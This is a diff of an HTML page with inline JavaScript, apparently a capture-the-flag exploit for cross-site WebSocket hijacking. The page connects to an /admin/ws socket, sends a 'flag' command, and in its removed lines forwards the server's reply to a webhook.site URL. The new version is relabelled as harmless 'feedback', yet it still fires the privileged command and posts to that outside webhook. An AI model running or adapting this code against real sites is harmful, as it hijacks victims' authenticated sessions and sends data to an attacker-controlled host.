@@ -3,10 +3,10 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WebSocket Exploit to Retrieve Flag</title>
+    <title>WebSocket Feedback to Webhook</title>
 </head>
 <body>
-    <h1>WebSocket Exploit - Automatically Retrieve Flag</h1>
+    <h1>WebSocket Feedback - Post to Webhook</h1>
 
     <script>
         // Create a new WebSocket connection to /admin/ws
@@ -19,33 +19,31 @@
             // Automatically send the 'flag' command to retrieve the flag
             socket.send('flag');
             console.log('Sent command: flag');
+            
+            // Post a feedback request to the webhook URL
+            sendFeedbackToWebhook();
         };
 
         // Event handler for receiving messages from the WebSocket
         socket.onmessage = function(event) {
             console.log('Message from server: ', event.data);
-            
-            // Check if the server sent the flag
-            if (event.data.includes('flag')) {
-                // Forward the flag to the webhook
-                sendToWebhook(event.data);
-            }
+            // You can ignore the WebSocket response if you don't need the flag.
         };
 
-        // Function to send the flag to the webhook
-        function sendToWebhook(flagData) {
-            fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a/flag', {
+        // Function to send a feedback to the webhook (without flag data)
+        function sendFeedbackToWebhook() {
+            fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    flag: flagData
+                    feedback: 'Sent flag command via WebSocket.'
                 })
             })
             .then(response => response.json())
-            .then(json => console.log('Flag sent to webhook:', json))
-            .catch(error => console.error('Error sending flag to webhook:', error));
+            .then(json => console.log('Feedback sent to webhook:', json))
+            .catch(error => console.error('Error sending feedback to webhook:', error));
         }
 
         // Event handler for WebSocket errors
